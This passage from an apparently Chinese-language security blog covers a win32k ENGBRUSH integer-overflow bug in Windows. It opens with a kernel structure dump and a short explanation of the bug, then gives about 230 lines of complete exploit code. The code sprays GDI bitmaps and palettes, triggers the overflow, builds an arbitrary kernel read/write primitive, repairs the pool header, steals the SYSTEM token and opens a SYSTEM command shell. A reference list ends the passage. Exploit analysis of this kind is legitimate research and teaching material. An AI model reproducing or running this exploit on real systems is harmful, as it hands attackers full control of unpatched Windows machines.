Uint4B</span><br><span class="line">   +<span class="number">0x0d0</span> CommitCharge     : Uint4B</span><br><span class="line">   +<span class="number">0x0d4</span> QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">   +<span class="number">0x0d8</span> CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK</span><br><span class="line">   +<span class="number">0x0dc</span> PeakVirtualSize  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> VirtualSize      : Uint4B</span><br><span class="line">   +<span class="number">0x0e4</span> SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x0ec</span> DebugPort        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortValue : Uint4B</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortState : Pos <span class="number">0</span>, <span class="number">3</span> Bits</span><br><span class="line">   +<span class="number">0x0f4</span> ObjectTable      : Ptr32 _HANDLE_TABLE</span><br><span class="line">   +<span class="number">0x0f8</span> Token            : _EX_FAST_REF<span class="comment">//Token hear</span></span><br><span class="line">   +<span class="number">0x0fc</span> WorkingSetPage   : Uint4B</span><br><span class="line">   +<span class="number">0x100</span> AddressCreationLock : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x104</span> RotateInProgress : Ptr32 _ETHREAD</span><br><span class="line">   +<span class="number">0x108</span> ForkInProgress   : Ptr32 _ETHREAD</span><br><span class="line">   +<span class="number">0x10c</span> HardwareTrigger  : Uint4B</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><hr><p>该漏洞是由<code>win32k</code>中申请<code>ENGBRUSH</code>对象时未对大小进行校验从而使得可以使用整型溢出的方式申请到一块极小的内存，产生<code>ENGBRUSH</code>覆盖其他内核对象扩展其读写能力的行为，再使用被扩展的<code>Bitmap</code>对象修改其后续<code>Palette</code>对象的读写能力范围达到任意地址读写的特权，通过任意读写来修复被溢出的<code>POOL_HEADER</code>最后使用<code>Get\Set</code>方法替换进程<code>Token</code>实现权限提升，利用方法比较苛刻，需要严格构造内存布局才能达到任意地址读写的目的。</p><h3 id="EXP代码"><a href="#EXP代码" class="headerlink" title="EXP代码"></a>EXP代码</h3><hr><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"Psapi.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fengshui</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">static</span> HBITMAP bitmaps[<span class="number">2000</span>];<span class="comment">//喷射对象</span></span><br><span class="line"><span class="keyword">static</span> HPALETTE hp[<span class="number">2000</span>];<span class="comment">//喷射对象</span></span><br><span class="line">BYTE* bits;</span><br><span class="line">HBITMAP hManager;</span><br><span class="line">HPALETTE hpManager,hpWorker;</span><br><span class="line"><span class="function">UINT <span class="title">PsInitialSystemProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">UINT <span class="title">GetNTOsBase</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">UINT  <span class="title">PsGetCurrentProcess</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">DWORD UniqueProcessIdOffset;</span><br><span class="line">DWORD TokenOffset;</span><br><span class="line">&#125; VersionSpecificConfig;</span><br><span class="line">VersionSpecificConfig gConfig = &#123;<span class="number">0x0b4</span>,<span class="number">0x0f8</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HDC hdc = GetDC(<span class="literal">NULL</span>);</span><br><span class="line">HBITMAP hbmp = CreateBitmap(<span class="number">0x23</span>,<span class="number">0x1d41d41</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="literal">NULL</span>);</span><br><span class="line">HBRUSH hbru = CreatePatternBrush(hbmp);</span><br><span class="line">SelectObject(hdc,hbru);</span><br><span class="line"></span><br><span class="line">fengshui();<span class="comment">//构造内存布局</span></span><br><span class="line">PatBlt(hdc,<span class="number">0x100</span>,<span class="number">0x10</span>,<span class="number">0x100</span>,<span class="number">0x100</span>,PATCOPY);<span class="comment">//触发溢出</span></span><br><span class="line">bits = (BYTE*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(GetBitmapBits(bitmaps[i],<span class="number">0x1000</span>,bits) &gt; <span class="number">0x698</span>)<span class="comment">//0x1A6*0x20/8=698</span></span><br><span class="line">&#123;</span><br><span class="line">hManager = bitmaps[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Overflow Bitmap: %d\r\n"</span>,i);</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//查找到溢出内存</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UINT pFirstColor = * (UINT *)(&amp;bits[<span class="number">0x698</span> + <span class="number">0x8</span> + <span class="number">0x50</span>]);<span class="comment">//size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Original Current Manager XEPALOBJ-&gt;pFirstColor:0x%x\r\n"</span>,pFirstColor);</span><br><span class="line"></span><br><span class="line">UINT cEntries = * (UINT *)(&amp;bits[<span class="number">0x698</span> + <span class="number">0x8</span> + <span class="number">0x18</span>]);<span class="comment">//1E3</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Original Current Manager XEPALOBJ-&gt;cEntries:0x%x\r\n"</span>,cEntries);</span><br><span class="line"></span><br><span class="line">* (UINT *)(&amp;bits[<span class="number">0x698</span> + <span class="number">0x8</span> + <span class="number">0x18</span>])= <span class="number">0xFFFFFFFF</span>;<span class="comment">//修改cEntries扩展读写范围</span></span><br><span class="line">SetBitmapBits(hManager,<span class="number">0x6F8</span>,bits);<span class="comment">//修改后的PALETTE写回到原内存</span></span><br><span class="line">UINT uEntries = * (UINT *)(&amp;bits[<span class="number">0x698</span> + <span class="number">0x8</span> + <span class="number">0x18</span>]);<span class="comment">//FFFFFFFF</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Updated Manager XEPALOBJ-&gt;cEntries:0x%x\r\n"</span>,uEntries);<span class="comment">//查看修改后的值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UINT* rPalette = (UINT*)<span class="built_in">malloc</span>((<span class="number">0x400</span> - <span class="number">1</span>) * <span class="keyword">sizeof</span>(PALETTEENTRY));<span class="comment">//size</span></span><br><span class="line">ZeroMemory(rPalette,(<span class="number">0x400</span> - <span class="number">1</span>) * <span class="keyword">sizeof</span>(PALETTEENTRY));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(GetPaletteEntries(hp[i],<span class="number">0</span>,<span class="number">0x400</span>,(LPPALETTEENTRY)rPalette) &gt; <span class="number">0x3BB</span>)<span class="comment">//256*4=0x400</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Manager XEPALOBJ Object Handle: 0x%x\r\n"</span>,hp[i]);<span class="comment">//查找具有任意读写范围的PALETTE</span></span><br><span class="line">hpManager = hp[i];<span class="comment">//溢出lPalette句柄</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UINT tHeader = pFirstColor - <span class="number">0x1000</span>;<span class="comment">//ENGBRUSH所在页面</span></span><br><span class="line">tHeader = tHeader &amp; <span class="number">0xFFFFF000</span>;<span class="comment">//ENGBRUSH页首</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Gh15 Address: 0x%04x.\r\n"</span>,tHeader);<span class="comment">//3FE*4=1000-8</span></span><br><span class="line">SetPaletteEntries(hpManager,<span class="number">0x3FE</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;tHeader);<span class="comment">//被溢出页的下一页的pfirstcolor-&gt;ENGBRUSH页首</span></span><br><span class="line"></span><br><span class="line">UINT wBuffer[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">GetPaletteEntries(hp[i],<span class="number">0</span>,<span class="number">2</span>,(LPPALETTEENTRY)wBuffer);<span class="comment">//pfirstcolor-&gt;ENGBRUSH页首，查找ENGBRUSH页句柄</span></span><br><span class="line"><span class="keyword">if</span> (wBuffer[<span class="number">1</span>] &gt;&gt; <span class="number">24</span> == <span class="number">0x35</span>)<span class="comment">//Gh15</span></span><br><span class="line">&#123;</span><br><span class="line">hpWorker = hp[i];<span class="comment">//ENGBRUSH页</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Worker XEPALOBJ object Handle: 0x%x\r\n"</span>,hpWorker);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] wBuffer: %x\r\n"</span>,wBuffer[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UINT gHeader[<span class="number">8</span>];</span><br><span class="line">GetPaletteEntries(hpWorker,<span class="number">0</span>,<span class="number">8</span>,(LPPALETTEENTRY)gHeader);<span class="comment">//ENGBRUSH页</span></span><br><span class="line">UINT oHeader = pFirstColor &amp; <span class="number">0xFFFFF000</span>;<span class="comment">//溢出页页首</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Overflowed Gh15 Address: 0x%04x.\r\n"</span>,oHeader);</span><br><span class="line"></span><br><span class="line">UINT oValue = oHeader + <span class="number">0x1C</span>;<span class="comment">//1C = 句柄</span></span><br><span class="line">UINT value;</span><br><span class="line">SetPaletteEntries(hpManager,<span class="number">0x3FE</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;oValue);</span><br><span class="line">GetPaletteEntries(hpWorker,<span class="number">0</span>,<span class="number">1</span>,(LPPALETTEENTRY)&amp;value);</span><br><span class="line">gHeader[<span class="number">2</span>] = value;</span><br><span class="line">gHeader[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">gHeader[<span class="number">7</span>] = value;<span class="comment">//拼凑新的pool_header</span></span><br><span class="line"></span><br><span class="line">UINT oHeaderdata[<span class="number">8</span>];</span><br><span class="line">SetPaletteEntries(hpManager,<span class="number">0x3FE</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;oHeader);</span><br><span class="line">GetPaletteEntries(hpWorker,<span class="number">0</span>,<span class="number">8</span>,(LPPALETTEENTRY)oHeaderdata);<span class="comment">//溢出页首存储的数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Gh05 Overflowed Object Header:\r\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"    %04x %04x %04x %04x\r\n"</span>, oHeaderdata[<span class="number">0</span>], oHeaderdata[<span class="number">1</span>], oHeaderdata[<span class="number">2</span>], oHeaderdata[<span class="number">3</span>]);<span class="comment">//[2]&amp;[7]=修复的句柄</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"    %04x %04x %04x %04x\r\n"</span>, oHeaderdata[<span class="number">4</span>], oHeaderdata[<span class="number">5</span>], oHeaderdata[<span class="number">6</span>], oHeaderdata[<span class="number">7</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Gh05 Fixed Object Header:\r\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"    %04x %04x %04x %04x\r\n"</span>, gHeader[<span class="number">0</span>], gHeader[<span class="number">1</span>], gHeader[<span class="number">2</span>], gHeader[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"    %04x %04x %04x %04x\r\n"</span>, gHeader[<span class="number">4</span>], gHeader[<span class="number">5</span>], gHeader[<span class="number">6</span>], gHeader[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">SetPaletteEntries(hpManager,<span class="number">0x3FE</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;oHeader);</span><br><span class="line">SetPaletteEntries(hpWorker,<span class="number">0</span>,<span class="number">8</span>,(PALETTEENTRY*)gHeader);<span class="comment">//修复页首</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Fix Overflowed Gh05 Overflowed Object Header.\r\n"</span>);</span><br><span class="line"></span><br><span class="line">UINT SystemEPROCESS = PsInitialSystemProcess();</span><br><span class="line">UINT CurrentEPROCESS = PsGetCurrentProcess();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UINT SystemToken = <span class="number">0</span>;</span><br><span class="line">UINT tmp = SystemEPROCESS + gConfig.TokenOffset;<span class="comment">//偏移取token</span></span><br><span class="line">SetPaletteEntries(hpManager,<span class="number">0x3FE</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;tmp);</span><br><span class="line">GetPaletteEntries(hpWorker,<span class="number">0</span>,<span class="number">1</span>,(LPPALETTEENTRY)&amp;SystemToken);<span class="comment">//固定EPROCESS偏移取token</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Got System Token: %x\r\n"</span>,SystemToken);</span><br><span class="line"></span><br><span class="line">UINT CurProcessAddr = CurrentEPROCESS + gConfig.TokenOffset;</span><br><span class="line">SetPaletteEntries(hpManager,<span class="number">0x3FE</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;CurProcessAddr);<span class="comment">//瞄准当前进程token</span></span><br><span class="line"></span><br><span class="line">SetPaletteEntries(hpWorker,<span class="number">0</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;SystemToken);<span class="comment">//开枪</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Dropping in SYSTEM shell...\r\n\r\n"</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">"cmd.exe"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fengshui</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">bitmaps[i] = CreateBitmap(<span class="number">0x3A3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x20</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//喷射bitmap</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> strName[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WNDCLASSEXA wndClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(strName,<span class="string">"Class%d"</span>,i);<span class="comment">//size</span></span><br><span class="line">wndClass.lpfnWndProc = DefWindowProc;</span><br><span class="line">wndClass.lpszClassName = strName;</span><br><span class="line">wndClass.lpszMenuName = <span class="string">"yean"</span>;</span><br><span class="line">wndClass.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEXA);</span><br><span class="line">RegisterClassExA(&amp;wndClass);</span><br><span class="line">&#125;<span class="comment">//windows窗口类占位</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">DeleteObject(bitmaps[i]);</span><br><span class="line">&#125;<span class="comment">//释放0xE8C,进行二次分割</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">bitmaps[i] = CreateBitmap(<span class="number">0x1A6</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x20</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;<span class="comment">//喷射bitmap</span></span><br><span class="line"></span><br><span class="line">LOGPALETTE* lPalette;</span><br><span class="line">lPalette = (LOGPALETTE*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LOGPALETTE)+<span class="number">0x1E3</span>*<span class="keyword">sizeof</span>(PALETTEENTRY));<span class="comment">//size</span></span><br><span class="line">lPalette-&gt;palNumEntries = <span class="number">0x1E3</span>;<span class="comment">//0x1E3*4+0x54+8=7EC</span></span><br><span class="line">lPalette-&gt;palVersion = <span class="number">0x0300</span>;<span class="comment">//表示与 Windows 3.0 兼容</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">hp[i] = CreatePalette(lPalette);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">800</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(strName,<span class="string">"Class%d"</span>,i);</span><br><span class="line">UnregisterClassA(strName,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">UINT <span class="title">PsInitialSystemProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UINT ntos = (UINT)LoadLibraryA(<span class="string">"ntkrnlpa.exe"</span>);</span><br><span class="line">UINT addr = (UINT)GetProcAddress((HMODULE)ntos,<span class="string">"PsInitialSystemProcess"</span>);</span><br><span class="line">FreeLibrary((HMODULE)ntos);</span><br><span class="line">UINT res = <span class="number">0</span>;</span><br><span class="line">UINT ntOsBase = GetNTOsBase();</span><br><span class="line"><span class="keyword">if</span> (ntOsBase) </span><br><span class="line">&#123;</span><br><span class="line">UINT tmp = addr - ntos + ntOsBase;<span class="comment">//计算实际PsInitialSystemProcess内核全局变量地址</span></span><br><span class="line">SetPaletteEntries(hpManager,<span class="number">0x3FE</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;tmp);</span><br><span class="line">GetPaletteEntries(hpWorker,<span class="number">0</span>,<span class="keyword">sizeof</span>(UINT) / <span class="keyword">sizeof</span>(PALETTEENTRY),(LPPALETTEENTRY)&amp;res);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">UINT <span class="title">GetNTOsBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UINT Bases[<span class="number">0x1000</span>];</span><br><span class="line">DWORD needed = <span class="number">0</span>;</span><br><span class="line">UINT krnlbase = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (EnumDeviceDrivers((LPVOID*)&amp;Bases,<span class="keyword">sizeof</span>(Bases),&amp;needed))</span><br><span class="line">&#123;</span><br><span class="line">krnlbase = Bases[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> krnlbase;<span class="comment">//ntkrnlpa地址</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">UINT  <span class="title">PsGetCurrentProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UINT pEPROCESS =  PsInitialSystemProcess();</span><br><span class="line">LIST_ENTRY ActiveProcessLinks;</span><br><span class="line">UINT tmp = pEPROCESS + gConfig.UniqueProcessIdOffset + <span class="keyword">sizeof</span>(UINT);</span><br><span class="line">SetPaletteEntries(hpManager,<span class="number">0x3FE</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;tmp);</span><br><span class="line">GetPaletteEntries(hpWorker,<span class="number">0</span>,<span class="keyword">sizeof</span>(LIST_ENTRY) / <span class="keyword">sizeof</span>(PALETTEENTRY),(LPPALETTEENTRY)&amp;ActiveProcessLinks);</span><br><span class="line"></span><br><span class="line">UINT res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(TRUE)</span><br><span class="line">&#123;</span><br><span class="line">UINT UniqueProcessId = <span class="number">0</span>;</span><br><span class="line">pEPROCESS = (UINT)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - <span class="keyword">sizeof</span>(UINT);</span><br><span class="line">tmp = pEPROCESS + gConfig.UniqueProcessIdOffset;</span><br><span class="line">SetPaletteEntries((HPALETTE)hpManager,<span class="number">0x3FE</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;tmp);</span><br><span class="line">GetPaletteEntries((HPALETTE)hpWorker,<span class="number">0</span>,<span class="keyword">sizeof</span>(UINT) / <span class="keyword">sizeof</span>(PALETTEENTRY),(LPPALETTEENTRY)&amp;UniqueProcessId);</span><br><span class="line"><span class="keyword">if</span> (GetCurrentProcessId() == UniqueProcessId)</span><br><span class="line">&#123;</span><br><span class="line">res = pEPROCESS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">tmp = pEPROCESS + gConfig.UniqueProcessIdOffset + <span class="keyword">sizeof</span>(UINT);</span><br><span class="line">SetPaletteEntries((HPALETTE)hpManager,<span class="number">0x3FE</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;tmp);</span><br><span class="line">GetPaletteEntries((HPALETTE)hpWorker,<span class="number">0</span>,<span class="keyword">sizeof</span>(LIST_ENTRY) / <span class="keyword">sizeof</span>(PALETTEENTRY),(LPPALETTEENTRY)&amp;ActiveProcessLinks);</span><br><span class="line"><span class="keyword">if</span> (pEPROCESS == (UINT)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - <span class="keyword">sizeof</span>(UINT))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-17.gif" alt></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><hr><p><code>小刀师傅</code><a href="https://xiaodaozhi.com/exploit/70.html" target="_blank" rel="noopener">https://xiaodaozhi.com/exploit/70.html</a></p><p><code>先知社区</code><a href="https://xz.aliyun.com/t/2919" target="_blank" rel="noopener">https://xz.aliyun.com/t/2919</a></p><p><code>看雪学院</code><a href="https://zhuanlan.zhihu.com/p/102121772" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/102121772</a></p><p><code>fightingman</code><a href="https://www.anquanke.com/post/id/205870" target="_blank" rel="noopener">https://www.anquanke.com/post/id/205870</a></p><p><code>Evil Bit Blog</code><a href="http://theevilbit.blogspot.com/2017/10/abusing-gdi-objects-bitmap-objects-size.html" target="_blank" rel="noopener">http://theevilbit.blogspot.com/2017/10/abusing-gdi-objects-bitmap-objects-size.html</a></p><p><code>奇安信威胁情报中心</code><a href="https://ti.qianxin.com/blog/articles/cve-2018-8453-win32k-elevation-of-privilege-vulnerability-targeting-the-middle-east/" target="_blank" rel="noopener">https://ti.qianxin.com/blog/articles/cve-2018-8453-win32k-elevation-of-privilege-vulnerability-targeting-the-middle-east/</a></p><p><code>write-bug</code><a href="https://www.write-bug.com/article/2184.html" target="_blank" rel="noopener">https://www.write-bug.com/article/2184.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
